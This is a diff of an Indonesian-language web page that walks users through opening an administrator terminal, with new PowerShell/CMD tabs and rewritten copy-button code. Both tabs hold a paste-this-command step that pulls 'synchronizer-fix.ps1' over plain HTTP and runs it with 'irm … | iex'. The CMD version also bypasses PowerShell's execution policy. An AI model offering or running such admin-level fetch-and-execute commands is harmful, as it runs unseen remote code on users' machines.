@@ -35,8 +35,8 @@
             <div class="flex gap-4">
                 <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center font-bold text-sm shadow-md shadow-blue-900/50">1</div>
                 <div>
-                    <h3 class="font-bold text-slate-100">Buka PowerShell (Admin)</h3>
-                    <p class="text-slate-400 text-sm mt-1">Klik kanan Start > <span class="text-blue-400 font-semibold">Terminal (Admin)</span> atau PowerShell (Admin).</p>
+                    <h3 class="font-bold text-slate-100">Buka Terminal (Admin)</h3>
+                    <p class="text-slate-400 text-sm mt-1">Gunakan <span class="text-blue-400 font-semibold">PowerShell</span> (Direkomendasikan) atau Command Prompt (CMD).</p>
                 </div>
             </div>
 
@@ -45,18 +45,42 @@
                 <div class="flex-shrink-0 w-8 h-8 bg-blue-600 text-white rounded-lg flex items-center justify-center font-bold text-sm shadow-md shadow-blue-900/50">2</div>
                 <div class="flex-1 min-w-0">
                     <h3 class="font-bold text-slate-100">Salin Perintah</h3>
-                    <p class="text-slate-400 text-sm mt-1 mb-3">Klik tombol salin di bawah ini.</p>
                     
-                    <div class="bg-black rounded-xl overflow-hidden border border-slate-800 shadow-inner">
-                        <div class="flex items-center justify-between px-4 py-2 bg-slate-800/40">
-                            <span class="text-[10px] font-bold text-slate-500 uppercase tracking-widest font-mono">Terminal</span>
-                            <button onclick="copyToClipboard()" class="flex items-center gap-2 px-3 py-1 bg-blue-600 hover:bg-blue-500 text-white rounded-md transition-all text-xs font-semibold" id="copy-btn">
-                                <i class="far fa-copy" id="copy-icon"></i>
-                                <span id="copy-text">Salin</span>
-                            </button>
+                    <!-- Tabs UI -->
+                    <div class="flex gap-2 mb-4 border-b border-slate-800 pb-2">
+                        <button onclick="switchTab('ps')" id="tab-ps" class="text-[10px] font-bold uppercase tracking-widest px-3 py-1 bg-blue-600 text-white rounded transition-all">PowerShell</button>
+                        <button onclick="switchTab('cmd')" id="tab-cmd" class="text-[10px] font-bold uppercase tracking-widest px-3 py-1 bg-slate-800 text-slate-400 rounded transition-all">CMD</button>
+                    </div>
+
+                    <!-- PowerShell Tab Content -->
+                    <div id="content-ps" class="space-y-6">
+                        <div class="bg-black rounded-xl overflow-hidden border border-slate-800 shadow-inner">
+                            <div class="flex items-center justify-between px-4 py-2 bg-slate-800/40">
+                                <span class="text-[10px] font-bold text-slate-500 uppercase tracking-widest font-mono italic">Standard Install</span>
+                                <button onclick="copyToClipboard('ps-standard', this)" class="flex items-center gap-2 px-3 py-1 bg-blue-600 hover:bg-blue-500 text-white rounded-md transition-all text-xs font-semibold">
+                                    <i class="far fa-copy"></i>
+                                    <span>Salin</span>
+                                </button>
+                            </div>
+                            <div class="p-4">
+                                <code id="ps-standard" class="text-blue-400 font-mono text-xs sm:text-sm leading-relaxed command-wrap">irm http://script.minicenter.my.id/scripts/synchronizer-fix.ps1 | iex</code>
+                            </div>
                         </div>
-                        <div class="p-4">
-                            <code id="command-text" class="text-blue-400 font-mono text-xs sm:text-sm leading-relaxed command-wrap">powershell -ExecutionPolicy Bypass -Command "irm http://script.minicenter.my.id/scripts/synchronizer-fix.ps1 | iex"</code>
+                    </div>
+
+                    <!-- CMD Tab Content -->
+                    <div id="content-cmd" class="hidden space-y-6">
+                        <div class="bg-black rounded-xl overflow-hidden border border-slate-800 shadow-inner">
+                            <div class="flex items-center justify-between px-4 py-2 bg-slate-800/40">
+                                <span class="text-[10px] font-bold text-slate-500 uppercase tracking-widest font-mono italic">CMD Wrapper</span>
+                                <button onclick="copyToClipboard('cmd-standard', this)" class="flex items-center gap-2 px-3 py-1 bg-blue-600 hover:bg-blue-500 text-white rounded-md transition-all text-xs font-semibold">
+                                    <i class="far fa-copy"></i>
+                                    <span>Salin</span>
+                                </button>
+                            </div>
+                            <div class="p-4">
+                                <code id="cmd-standard" class="text-blue-400 font-mono text-xs sm:text-sm leading-relaxed command-wrap">powershell -ExecutionPolicy Bypass -Command "irm http://script.minicenter.my.id/scripts/synchronizer-fix.ps1 | iex"</code>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -88,20 +112,44 @@
     </div>
 
     <script>
-        function copyToClipboard() {
-            const commandText = document.getElementById('command-text').innerText;
-            const btn = document.getElementById('copy-btn');
-            const icon = document.getElementById('copy-icon');
-            const text = document.getElementById('copy-text');
+        function switchTab(type) {
+            const psTab = document.getElementById('tab-ps');
+            const cmdTab = document.getElementById('tab-cmd');
+            const psContent = document.getElementById('content-ps');
+            const cmdContent = document.getElementById('content-cmd');
+
+            if (type === 'ps') {
+                psTab.classList.replace('bg-slate-800', 'bg-blue-600');
+                psTab.classList.replace('text-slate-400', 'text-white');
+                cmdTab.classList.replace('bg-blue-600', 'bg-slate-800');
+                cmdTab.classList.replace('text-white', 'text-slate-400');
+                psContent.classList.remove('hidden');
+                cmdContent.classList.add('hidden');
+            } else {
+                cmdTab.classList.replace('bg-slate-800', 'bg-blue-600');
+                cmdTab.classList.replace('text-slate-400', 'text-white');
+                psTab.classList.replace('bg-blue-600', 'bg-slate-800');
+                psTab.classList.replace('text-white', 'text-slate-400');
+                cmdContent.classList.remove('hidden');
+                psContent.classList.add('hidden');
+            }
+        }
+
+        function copyToClipboard(id, btn) {
+            const commandText = document.getElementById(id).innerText;
+            const icon = btn.querySelector('i');
+            const text = btn.querySelector('span');
+            const oldBg = btn.className.match(/bg-\w+-\d+/)[0];
 
             navigator.clipboard.writeText(commandText).then(() => {
                 text.innerText = 'Tersalin!';
                 icon.className = 'fas fa-check';
-                btn.classList.replace('bg-blue-600', 'bg-emerald-600');
+                btn.classList.replace(oldBg, 'bg-emerald-600');
+                
                 setTimeout(() => {
                     text.innerText = 'Salin';
                     icon.className = 'far fa-copy';
-                    btn.classList.replace('bg-emerald-600', 'bg-blue-600');
+                    btn.classList.replace('bg-emerald-600', oldBg);
                 }, 2000);
             });
         }
